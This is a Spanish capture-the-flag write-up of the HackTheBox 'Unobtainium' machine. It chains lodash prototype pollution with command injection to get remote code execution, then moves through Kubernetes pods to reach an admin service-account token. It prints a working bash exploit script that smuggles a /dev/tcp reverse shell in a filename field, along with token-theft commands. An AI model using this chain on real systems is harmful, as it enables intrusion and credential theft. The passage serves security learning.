* [Command Injection - **google-cloudstorage-commands**](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431).

***La cosa es que este bug no nos permitirá <u>subir un archivo</u>, ya que no le indicara al servicio que nos active el objeto `canUpload`. Pero esta interesante tenerlo por si conseguimos asignarnos el objeto.***

Con la idea de mirar las librerías nos situamos ahora en [lodash](https://lodash.com/), que es usada en la creación del mensaje:

```js
const _ = require('lodash');
...
...
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });
...
```

Ahí están los campos que vimos al hacer las 10 peticiones con el **for** y el mensaje es manipulado con `req.body.message`.

Algo que vemos es el uso de la función [merge()](https://lodash.com/docs/4.17.15#merge), que básicamente juega con tres objetos:

* (1) `message`.
* (2) `req.body.message`.
* (3) `id - timestamp - username`.

Y los usa para tomar las propiedades de los objetos `2` y `3` yyyyy heredárselos al objeto `1`, así de sencillo.

[Este es un ejemplo](https://masteringjs.io/tutorials/lodash/merge) que encontré:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_example.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y esta sería una simulación de lo que pasa al crear el mensaje y como la variable `message` hereda el valor del mensaje que enviamos junto a los demás objetos:

![338google_mergeFunc_simulationMessage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_simulationMessage.png)

Perfecto, sabemos como se genera toooda la trama que vemos al crear un mensaje (:

...

## Prototype Pollution en <u>lodash.merge</u> para asignar <u>canUpdate</u> al usuario <u>felamos</u> [📌](#prototype-pollution) {#prototype-pollution}

La cosa es que buscando info sobre **merge()** y si existen vulnerabilidades para ella nos damos cuenta de que sí, existen cositas para jugar...

* [Prototype Pollution -  **lodash.merge**](https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173732).

La [contaminación de prototipos](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications) se basa en la inyección de propiedades dentro de -prototipos- existentes en JS, como pueden ser los **objetos**.

Cuando un objeto es creado va a contener propiedades y métodos necesarios de un prototipo (ya que JS esta basado en prototipos), esos prototipos contienen atributos "mágicos" o "esenciales" tales como `_proto_`, `constructor` y `prototype`. Lo que pasa es que **JS** permite que esos atributos sean alterados, esto (por culpa de **merge()**) le da la mano al atacante (a nosotros) de sobreescribir o contaminar objetos de la aplicación 🤯

Nos guiaremos de este recurso para probar la contaminación:

* [Demonstration of **_.merge** pollution vulnerability](https://github.com/kimmobrunfeldt/lodash-merge-pollution-example).

Lo que hace es subir un archivo que contiene el atributo -mágico- `_proto_` con el objeto que quiere contaminar, o sea, cambiar. 

Sube `attack.json`:

![338google_pollution_attackJSON](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_pollution_attackJSON.png)

Muy sencillo, al usuario `john.doe@mail.com` le asigna el objeto `admin`...

Nosotros podríamos probar a asignar `canUpdate` al usuario **felamos** usando el mismo atributo e intentar **subir (`/upload`)** algún archivo 👀:

![338burp_unobtainium_upload_pollution_withCanUP_fail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png)

Pero no, espero que alguno sepa ya el porqué... :P

Básicamente es porque la función vulnerable (`merge()`) esta en la creación del mensaje y no en la subida del archivo, entonces primero debemos contaminar el objeto para luego ahí si probar si se nos asignó el poder de subir archivos (:

Creamos mensaje maligno :P

![338burp_unobtainium_message_pollution_withCanUP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_pollution_withCanUP.png)

Y ahora intentamos subir un archivoooooooooooooooooooooooooooooo:

![338burp_unobtainium_upload_pollution_withCanUP_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png)

PERFECTOOOOOOOOOO, podemos subir archivoooooooooooslsssssssslakdjflasdflasjdfl (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_letsgodrake.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Intentando ver el archivo (que no tiene contenido :P) el servidor se muere e.e

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_holaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peeeero tooodos tranquilos, recordemos nuestra vulnerabilidad con `google-cloudstorage-commands`.

...

## RCE = Prototype Pollution (<u>lodash.merge</u>) + Command Injection (<u>google-cloudstorage</u>) [📌](#prototype-pollution-rce) {#prototype-pollution-rce}

Ya podemos crear archivos, tenemos la posibilidad de pasarle el nombre del archivo, veamos como era la inyección de comandos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInjCut.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Simplemente debemos colocar: 

```js
& <comando_que_queremos_ejecutar>
```

Va a tomar un nombre vacío y después ejecutaría el comando, aún no hemos comprobado que funcione, pero pa eso estamos, ¿no? a veeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_idINholaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo que queremos es que tome el resultado del comando `id` y lo guarde en el archivo `hola.txt`, así validamos su contenido con **Todo**, el archivo se creó, por lo que esperamos que se haya ejecutado el comando, validemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_idINholaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Yyyyyyyy sí, **tenemos ejecución remota de comandosssssss**, que bestialidad esooooooooo, me encantoooooooooooooooo...

Pues aprovechemonos de esto para entablarnos una Reverse Shell.

Nos ponemos en escucha: 

```bash
❱ nc -lvp 4433
```

Y ejecutamos:

![338burp_unobtainium_upload_pollution_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_revsh.png)

Revisamos nuestro listener yyyyyyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_nc_pollutionRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Sip, es bastante fea jajaj, hacemos un tratamiento de TTY superrápido y tamos listos pa seguir (:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

Estamos en un contenedor (: y en él tenemos acceso a la flag de usuario `user.txt`.

...

Con ayuda de **Python** creamos un script que ya sea, nos ejecuta algunos comandos remotamente o nos entabla una Shell en el propio script, ahí se los dejo (:

> [pollutionRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py)

...

# docker-webapp -> docker-devnode [#](#lateral-webapp-devnode) {#lateral-webapp-devnode}

Estando dentro encontramos poquitas cosas, enumerando las variables de entorno tenemos algunas referencias a **Kubernetes**:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ env
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_env.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La aplicación en `10.96.137.170:3000` fue la que explotamos. Nos llama la atención `10.96.0.1:443`, jugando con `cURL` nos responde:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl -k https://10.96.0.1:443
```

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}
```

Jmmm... Investigando sobre **Kubernetes** encontramos cositas interesantes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_necesidadkubernetes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomada de: [docker-a-kubernetes](https://www.xataka.com/otros/docker-a-kubernetes-entendiendo-que-contenedores-que-mayores-revoluciones-industria-desarrollo).

Y si, ahí entra **Kubernetes**:

En pocas palabras es un gestionador de contenedores (el "maestro de orquesta"), ayuda a reunir tooodos los contenedores y armar clústeres (para que trabajen como si fueran uno), ya teniéndolos es muuuucho más sencillo el administrarlos, implementarlos y escalarlos.

* [kubernetes.io - What is **Kubernetes**](https://kubernetes.io/es/docs/concepts/overview/what-is-kubernetes/).
* [azure.microsoft.com - What is **Kubernetes**](https://azure.microsoft.com/es-es/topic/what-is-kubernetes/).
* [redhat.com - What is **Kubernetes**](https://www.redhat.com/es/topics/containers/what-is-kubernetes).

Buscando como podemos comunicarnos con **Kubernetes** llegamos a [este recurso](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#without-using-a-proxy):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_accessAPI_curl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Validando si tenemos los archivos necesarios vemos que si:

```bash
root@webapp-deployment-5d764566f4-mbprj:/var/run/secrets/kubernetes.io/serviceaccount$ ls
ca.crt  namespace  token
```

---

## Jugando con la <u>API</u> y con <u>kubectl</u> [📌](#expl-webapp-api-kubectl) {#expl-webapp-api-kubectl}

Así que generemos esas variables e intentemos de nuevo usar `cURL`:

```bash
root@webapp-deployment-5d764566f4-mbprj:~$ APISERVER=https://10.96.0.1:443
root@webapp-deployment-5d764566f4-mbprj:~$ SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
root@webapp-deployment-5d764566f4-mbprj:~$ TOKEN=$(cat ${SERVICEACCOUNT}/token)
root@webapp-deployment-5d764566f4-mbprj:~$ CACERT=${SERVICEACCOUNT}/ca.crt
```

Intentamos la petición hacia la **API**:

```bash
root@webapp-deployment-5d764566f4-mbprj:/$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

```json
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "10.10.10.235:8443"
    }
  ]
}
```

Bien, peeeeeeeeeeeeerfecto.

Vemos que externamente la API esta en el puerto **8443**, por lo que podemos asignar las mismas variables (moviéndonos el archivo `token` y `cacert`) en nuestra máquina y debería funcionar (:

Ya que nos podemos comunicar con la **API** empezaríamos a buscar cositas y ver como aprovecharnos de ellas...

* [Conceptos y arquitectura de **Kubernetes**](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#architecture).

...

En [este post](https://www.elladodelmal.com/2019/01/hacking-kubernetes-auditoria-de.html) usan una herramienta llamada [Kube-Hunter](https://github.com/aquasecurity/kube-hunter) que se encarga de encontrar posibles vulnerabilidades en **Kubernetes**, descargándola, moviéndola a la máquina y ejecutando solo nos muestra una vulnerabilidad:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kube-hunt --cidr 10.96.0.1
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_kubeHunter.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Donde únicamente nos reporta una versión, pero dando vueltas con ella no logramos nada :'(

En nuestra búsqueda llegamos ahora a [este post](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1), acá juega con la **API** mediante `cURL` y una herramienta llamada `kubectl`, que curiosamente el sistema tiene una tarea programa para en caso de encontrarlo, borrarlo:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ crontab -l
* * * * * find / -name kubectl -exec rm {} \;
```

Así que puede ser importante, pero veamos primero lo de `cURL`:

⚡ (***<u>Voy a simplificar el output, así que nos quedaremos con que estamos en</u> `<devnode>`***)

```bash
<devnode>$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/kube-system/secrets
```

Pero nos devuelve que no tenemos acceso a ese recurso como nuestro usuario ): peeeeero, ¿y si quitamos `secrets`?

```bash
<devnode>$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/kube-system
```

![338bash_pollutionSH_API_names_kubeSystem](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_API_names_kubeSystem.png)

Lindo, empezamos a encontrar rutas que nos devuelven algo distinto a **Forbidden**, así que tamos bieeeeen...

Estamos sobre un cluster llamado `kube-system`, si vamos hacia atras intentando listar los "[espacios de nombres](https://kubernetes.io/es/docs/concepts/overview/working-with-objects/namespaces/)" (clusters virtuales) encontramos uno llamativo:

```bash
<devnode>$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces
```

```json
{
  "kind": "NamespaceList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "65796"
  },
  "items": [
    {
      "metadata": {
        "name": "default",
    ...
      "metadata": {
        "name": "dev",
    ...
      "metadata": {
        "name": "kube-node-lease",
    ...
      "metadata": {
          "name": "kube-public",
    ...
      "metadata": {
          "name": "kube-system",
...
```

¿Cuál? Pos si, `dev`:

```bash
<devnode>$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/dev
```

Pero no vemos nada relevante, simplemente que ese `namespace` me sonó extraño y podemos tenerlo en cuenta por si algo...

...

Jugando con [kubelet](https://kubernetes.io/es/docs/tasks/tools/install-kubectl/) nos es más sencillo movernos, así que siguiendo [esta guía](https://kubernetes.io/es/docs/tasks/tools/install-kubectl/) logramos descargarlo, lo subimos a la máquina (recuerden cambiarle el nombre, si no, el sistema lo borra) y empezamos a probar cositas:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://10.10.14.146:8000/kubectl -o kubito
```

> [Siguiendo este **Cheat Sheet**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) de **kubectl** encontramos el uso de varios comandos.

Vamos viendo de manera más sencilla lo que habíamos encontrado con `cURL`, por ejemplo para ver los "espacios de nombre" simplemente ejecutamos:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get namespaces
NAME              STATUS   AGE
default           Active   167d
dev               Active   167d
kube-node-lease   Active   167d
kube-public       Active   167d
kube-system       Active   167d
```

Vemos a `dev`, que (despues de algunas pruebas) es el unico en el que tenemos "permisos" para leer cositas distintas a los demás:

> Validamos lo que podemos hacer contra cada `namespace`...

(Cambiamos `-n` por cada uno: **default**, **kube-node-lease**, **kube-public** y **kube-system**):

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n default        
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
...
```

**En los 4 podemos ver los `namespaces` (tenemos el mismo output)**, pero con `dev` podemos listar los **pods**:

> **Pod** es un grupo de uno (aunque sea uno se le llama grupo) o más contenedores dentro de un `namespace`.

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n dev    
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
...
```

Pues echemos un ojo:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get pods -n dev    
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         167d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         167d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         167d
```

Bien, encontramos 3 **pods**, podemos ver una descripción de cada uno usando `describe`, por ejemplo veamos la de `devnode-deployment-cd86fb5c-6ms8d`:

```bash
<devnode>$ ./kubito describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
```

> Es gigante el output :P

```yml
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:              
  devnode:               
    Container ID:   docker://d12ba992b0492f26740ce2664c04a232b9324d5f6c745098b1375682fd16b6c3
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 02 Jul 2021 05:41:11 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```

(Lo único que cambia entre los 3 es la dirección **IP** en la que están sirviendo:

```bash
* devnode-deployment-cd86fb5c-6ms8d : 172.17.0.4
* devnode-deployment-cd86fb5c-mvrfz : 172.17.0.5
* devnode-deployment-cd86fb5c-qlxww : 172.17.0.7
```

(Sí, sé lo que puedes estar pensando, tranqui, ya verás)

...

## Explotando y molestando al contenedor: <u>Prototype Pollution + Command Injection</u> [📌](#expl-webapp-bash-pollution) {#expl-webapp-bash-pollution}

Leyendo las descripciones con detenimiento (porque es con lo único con lo que podemos jugar) vemos que los contenedores están sirviendo en el puerto **3000** un servidor de node, que después de validar su respuesta recordé nuestra explotación inicial hacia el servidor **node**:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.4:3000; echo
[]
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
[]
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.6:3000; echo
curl: (7) Failed to connect to 172.17.0.6 port 3000: Connection refused
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.7:3000; echo
[]
```

La respuesta es nada, pero podemos intentar jugar con algún servidor de los 3 que hay para ver si estamos ante el mismo servicio que explotamos anteriormente (node), para esto mandemos un mensaje (como los que ya hicimos), solo que acá debemos usar `cURL`:

Juguemos con `http://172.17.0.5:3000`:

```bash
<devnode>$ curl -s -H 'Content-Type: application/json' -X PUT -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"holaaaaa"}}' http://172.17.0.5:3000
{"ok":true}
```

Al parecer nos dejó, por lo que vamos tirando a que efectivamente es el mismo servicio, comprobemos que se subió el mensaje:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
[{"icon":"__","text":"holaaaaa","id":1,"timestamp":1625437769543,"userName":"felamos"}]
```

Perfecto, pues estamos ejecutando el mismo servicio de antes (:

> **Perdi mucho tiempo al no centrarme en esto, es claro el *path* pero en su momento no lo vi :P**

Seguí enumerando y enumerando y nada, full perdido, así que me fui a buscar ayuda, esta fue la pista:

> "Piensa en `webapp` como `devnode`"...

Dando vueltas con ella caí en cuenta de algo al mirar la terminal y al leer lo que habíamos hecho hace un momento con `cURL` y el servidor node:

```bash
root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$
```

**webapp-deployment** esta en nuestro hostname yyyyyyy si miramos la descripción de algún **pod** vemos **devnode-deployment** en su nombre, podemos pensar que estamos situados en algún contenedor del **pod** que encierra a la aplicación web (`webapp`), por lo que si existen otros contenedores que (según su nombre) hacen referencia a entornos de desarrollo (`devnode`), probablemente debamos movernos a alguno de ellos :o APAAAA, entiendo tu PISTAAAaaAAAAa.

Peeeeero ¿y como nos movemoooooooos? :(

Pues acá entra en juego lo que habíamos probado con `cURL` y los servidores node internos, ya que ellos están sirviendo desde contenedores llamados `devnode-deployment...` y nosotros estamos sobre contenedores llamados `webapp-deployment...`. Por lo que simplemente deberíamos volver a ejecutar nuestra explotación, pero contra algún servidor **node** interno (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_woooooow.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Podemos crear un script en `bash` que nos haga la gestión muuuucho más rápido y sea estético, así evitamos tener que estar limpiando la terminal por culpa de los comandos `cURL` tan largos :P (además de practicar nuestro scripting en bash).

```bash
#!/bin/bash

# CTRL + C
function ctrl_c() {
    echo "s4l1eNdo..."
}
trap ctrl_c INT

# ---- Funciones del programa

todo_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "filename": "todo.txt"
    }
EOF
}

upload_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "filename": "& bash -c 'bash >& /dev/tcp/$1/$2 0>&1'"
    }
EOF
}

message_data() {
    cat <<EOF
    {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "message": {
            "text": "holadenuevorey",
            "__proto__": {
               "canUpload": "true"
            }
        }
    }
EOF
}

# ---- Variables globales

URL="$1"
IP="$2"
PORT="$3"

# ---- Inicio del programa

if [ -z $URL ] || [ -z $IP ] || [ -z $PORT ]; then
    echo -e "\n[!] Uso: $0 http://node_server lhost lport"
    echo -e "Ejemplo: $0 http://10.10.10.235:31337 10.10.14.146 4433\n"
    exit 1
else
    # Asignamos objeto `canUpload`
    curl -s -H "Content-Type: application/json" -X PUT -d "$(message_data)" $URL > /dev/null

    # Subimos archivo con comando
    curl -s -H "Content-Type: application/json" -X POST -d "$(upload_data $IP $PORT)" $URL/upload > /dev/null
    echo -e "\n[+] Reverse Shell Generada!!\n"
fi
```

> [insidePollutionRCE.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/insidePollutionRCE.sh)

Les dejo el script por si quieren jugar con él, la explotación es totalmente igual a la que hicimos, solo que en este caso jugamos con instrucciones de `bash`.

> **Tienen que validar que la IP que pongan exista, ya que se generan aleatoriamente y pueda que antes de un reset exista la `172.17.0.5` pero después no.**

(El script genera de una vez una **Reverse Shell**)

Lo movemos a la máquina, nos ponemos en escucha y ejecutamos de nuevo contra el servidor `http://172.17.0.5:3000`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTISIMOOOOOOOOOOOOOOOOOOOOOOO, tamos ahora en uno de los contenedores del **pod** `dev`, que lindura :3

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

...

## Encontramos token -secreto- del <u>admin</u> y obtenemos interacción total con <u>Kubernetes</u> [📌](#lateral-tokenadmin-found) {#lateral-tokenadmin-found}

Enumerando el sistema no encontramos nada distinto a los contenedores de `webapp`...

Contamos de nuevo con los archivos para hablar con la API**:

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/var/run/secrets/kubernetes.io/serviceaccount$ ls  
ca.crt  namespace  token
```

Así que podemos intentar ver si ahora tenemos algún permiso distinto o si descartamos que sea por acá. 

En vez de jugar con `cURL` subamos "`kubito`" que ya sabemos que vamos a obtener la misma info pero con un output más estético :D

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ curl http://10.10.14.146:8000/kubectl -o kubito
```

Jugando, jugando y jugando encontramos algo destino al probar de nuevo el subcomando `auth can-i` contra el **namespace** `kube-system`:

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
...
```

Podemos listar secretos de ese **nombre de espacio**...

🛳️ ***`Secret`: This is the place to store secret data like passwords, API keys, creds, etc. encoded in B64.*** [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#kubernetes-secrets).

Perfecto, para listarlos podemos apoyarnos del subcomando `get secrets`:

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito get secrets -n kube-system       
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      169d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      169d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      168d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      169d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      169d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      169d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      169d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      169d
default-token-l85f2                              kubernetes.io/service-account-token   3      169d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      169d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      169d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      169d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      169d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      169d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      169d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      169d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      169d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      169d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      169d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      169d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      169d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      169d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      169d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      169d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      169d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      169d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      169d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      169d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      169d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      169d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      169d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      169d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      169d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      169d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      169d
```

Listos, tenemos varios secretos, si nos fijamos en la columna `TYPE` nos indica que todos son [kubernetes.io/service-account-token](https://kubernetes.io/docs/concepts/configuration/secret/#service-account-token-secrets), que buscando un poco por la web entendemos que su contenido será siempre un [**JSON Web Token**](https://jwt.io/introduction), o sea, con los que ya hemos tratado:

```bash
(/run/secrets/kubernetes.io/serviceaccount/token)
```

Entre toooda la lista vemos algunos con nombre llamativo, pero hay dos que destacan:

````bash
* root-ca-cert-publisher-token-cnl86
* c-admin-token-tfmp2
```

Despues de algunas pruebas (que ya veremos) nos quedamos con `c-admin-token-tfmp2`, veamos su contenido:

(Estoy en otro hostname, pero no importa, estamos en unos de los containers del **pod** `devnode` igualmente).

![338bash_devnodeSH_kubito_secret_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_kubito_secret_admin.png)

Bien, una prueba que me llego a la cabeza fue intentar crear un **pod** con nuestro token actual (`/run/secrets/kubernetes.io/serviceaccount/token`), el token del secreto `root-ca-cert-publisher-token-cnl86` y el token del secreto `c-admin-token-tfmp2`, esta fue la razón por la que me quede con el token `c-admin-token-tfmp2`:

```bash
